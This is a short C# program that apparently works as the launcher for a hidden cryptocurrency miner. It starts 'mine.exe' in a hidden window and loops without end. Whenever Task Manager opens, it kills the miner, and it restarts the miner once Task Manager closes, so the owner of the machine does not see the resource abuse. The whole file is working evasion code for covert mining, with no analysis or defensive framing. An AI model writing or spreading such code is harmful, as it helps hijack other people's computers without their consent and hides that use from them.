using System;
using System.Diagnostics;
using System.IO;
using System.Threading;


Process myProcess = new Process();
myProcess.StartInfo.FileName = "cmd.exe";
myProcess.StartInfo.Arguments = $@"/C cd {Directory.GetParent(Directory.GetCurrentDirectory())} & mine.exe";
myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
myProcess.StartInfo.CreateNoWindow = true;

search();

void search()
{
    while (true)
    {
        Process[] disp = Process.GetProcessesByName("Taskmgr");
        Process[] mine = Process.GetProcessesByName("mine");
        if (disp.Length > 0)
        {
            foreach (Process proc in mine)
            {
                proc.Kill();
                Console.WriteLine("kill " + proc.ProcessName);
                Thread.Sleep(1000);
            }
        }
        else if (mine.Length == 0)
        {
            myProcess.Start();
            Console.WriteLine("Майн пшел");
            Thread.Sleep(1000);
        }
    }
}